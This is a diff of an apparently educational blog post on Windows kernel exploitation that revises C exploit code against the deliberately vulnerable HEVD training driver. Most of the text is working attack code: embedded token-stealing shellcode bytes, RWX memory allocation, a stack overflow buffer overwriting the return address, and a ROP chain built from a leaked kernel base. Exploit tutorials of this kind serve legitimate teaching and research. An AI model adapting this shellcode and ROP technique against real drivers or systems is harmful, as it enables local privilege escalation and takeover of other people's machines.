@@ -213,10 +213,9 @@ CHAR TokenStealingPayloadWin8[] =
 
 INT TriggerExploit(HANDLE hDevice);
 
-INT main() {
-
+INT main() 
+{
     HANDLE hDevice;
-    INT result;
     PCWSTR lpDeviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";
 
     hDevice = CreateFileW(
@@ -235,10 +234,10 @@ INT main() {
 
     printf("[+] Device opened successfully!\n");
 
-    result = TriggerExploit(hDevice);
-    if (result < 0) {
+    if (TriggerExploit(hDevice) >= 0) {
+        printf("[+] Exploit completed successfully!\n");
+    } else {
         printf("[-] Exploit failed: %lu\n", GetLastError());
-        return -1;
     }
 
     printf("[+] Cleaning up and closing handle...\n");
@@ -247,23 +246,19 @@ INT main() {
     return 0;
 }
 
-INT TriggerExploit(HANDLE hDevice) {
-
+INT TriggerExploit(HANDLE hDevice) 
+{
     UINT64 *lpInBuffer;
     LPVOID  lpShellcode;
     SIZE_T  inBufferSize;
     DWORD   bytesReturned;
     SIZE_T  shellcodeSize = sizeof(TokenStealingPayloadWin8);
 
-    
+
     // Allocate space for the shellcode
     printf("[+] Allocating executable memory for shellcode\n");
 
-    lpShellcode = VirtualAlloc(NULL, 
-                               shellcodeSize,
-                               MEM_COMMIT | MEM_RESERVE,
-                               PAGE_EXECUTE_READWRITE);
-    if (!lpShellcode) {
+    if (!(lpShellcode = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
         printf("[-] Failed to allocate memory for shellcode: %lu\n", GetLastError());
         return -1;
     }
@@ -275,27 +270,26 @@ INT TriggerExploit(HANDLE hDevice) {
 
 
     // Allocate a buffer of the correct size for the overflow.  Need to overflow 
-    // the buffer, three callee saved registers, and the return address.
-    inBufferSize = BUFFER_SIZE + (3 * POINTER_SIZE) + POINTER_SIZE;
+    // the buffer, three callee saved registers, and enough space for the ROP chain.
+    inBufferSize = BUFFER_SIZE + (3 * POINTER_SIZE) + CHAIN_SIZE;
     
     // Alocate the user buffer to be sent to the driver
-    lpInBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize);
-    if (!lpInBuffer) {
+    if (!(lpInBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize))) {
         printf("[-] Failed to allocate memory for buffer: %lu\n", GetLastError());
         return -1;
     }
-    
     printf("[+] Created buffer of size: %zu\n", inBufferSize);
     
+
     // Set buffer to be full of 'A's
     RtlFillMemory(lpInBuffer, inBufferSize, 'A');
 
     // Set last bytes of buffer to point to the shellcode.
     lpInBuffer[(inBufferSize / POINTER_SIZE) - 1] = (UINT64)lpShellcode;
 
+
     printf("[+] Sending buffer with IOCTL: 0x%x\n", HEVD_IOCTL_BUFFER_OVERFLOW);
 
-    
     BOOL result = DeviceIoControl(
         hDevice,
         HEVD_IOCTL_BUFFER_OVERFLOW,
@@ -310,7 +304,6 @@ INT TriggerExploit(HANDLE hDevice) {
         printf("[-] Failed to send IOCTL to HEVD Driver: %lu\n", GetLastError());
         return -1;
     }
-
     printf("[+] IOCTL sent successfully to HEVD driver!\n");
 
     printf("[+] Freeing input buffer...\n");
@@ -502,6 +495,7 @@ The exploit code is now the following .
 #define CHAIN_SIZE 4 * POINTER_SIZE  
 
 
+// https://github.com/stolenfootball/HEVDExploits/blob/main/BufferOverflowStack/Windows8x64/shellcode.asm
 CHAR TokenStealingPayloadWin8[] =
 {
 	0x50, 0x53, 0x51, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
@@ -513,7 +507,6 @@ CHAR TokenStealingPayloadWin8[] =
 	0x89, 0xEE, 0x49, 0x81, 0xC6, 0xD0, 0x00, 0x00, 0x00, 0x4D, 0x89, 0xF7,
 	0x4D, 0x8B, 0x7F, 0x30, 0x48, 0x83, 0xC4, 0x10, 0x59, 0x5B, 0x58, 0xC3
 };
-
 
 
 INT TriggerExploit(HANDLE hDevice);
@@ -540,9 +533,10 @@ INT main()
 
     printf("[+] Device opened successfully!\n");
 
-    if (!TriggerExploit(hDevice)) {
+    if (TriggerExploit(hDevice) >= 0) {
+        printf("[+] Exploit completed successfully!\n");
+    } else {
         printf("[-] Exploit failed: %lu\n", GetLastError());
-        return -1;
     }
 
     printf("[+] Cleaning up and closing handle...\n");
@@ -591,7 +585,17 @@ INT TriggerExploit(HANDLE hDevice)
     // Set buffer to be full of 'A's
     RtlFillMemory(lpInBuffer, inBufferSize, 'A');
 
+
     // Create the ROP Chain
+    if (!(kernelBase = GetKernelBaseAddress())) {
+        printf("[-] Failed to calculate kernel base\n");
+        return -1;
+    }
+
+    // Return address is at the buffer size plus the size of the three callee saved registers to 
+    // overwrite plus the size of the return address.  Since the array is of size UINT64, we need
+    // to divide by 8 to get the correct index into the array from the raw size in bytes, then 
+    // subtract one to account for zero indexing.
     returnAddrIndex = ((BUFFER_SIZE + (3 * POINTER_SIZE) + POINTER_SIZE) / POINTER_SIZE) - 1;
 
     lpInBuffer[returnAddrIndex++] = POP_RCX + kernelBase;
@@ -601,7 +605,7 @@ INT TriggerExploit(HANDLE hDevice)
 
 
     printf("[+] Sending buffer with IOCTL: 0x%x\n", HEVD_IOCTL_BUFFER_OVERFLOW);
-    
+        
     BOOL result = DeviceIoControl(
         hDevice,
         HEVD_IOCTL_BUFFER_OVERFLOW,
@@ -860,6 +864,9 @@ INT main()
     HANDLE hDevice;
     PCWSTR lpDeviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";
 
+    printf("[*] Author: @stolenfootball\n");
+    printf("[*] Website: https://stolenfootball.github.io\n\n");
+
     hDevice = CreateFileW(
         lpDeviceName,
         GENERIC_READ | GENERIC_WRITE,
@@ -1006,6 +1013,8 @@ UINT64 GetKernelBaseAddress()
     return (UINT64)pKernelBaseAddress;
 }
 ```
+
+As always, this can also be found on [Github](https://github.com/stolenfootball/HEVDExploits/blob/main/BufferOverflowStack/Windows8x64/exploit.c).
 
 ## Final thoughts
 That was a long post, but hopefully some people stuck with me for it.  The next post will be about bypassing VBS, the newest mitigation for local kernel exploitation.  Once you can do that, you can start writing exploits for brand new Windows 11 systems.
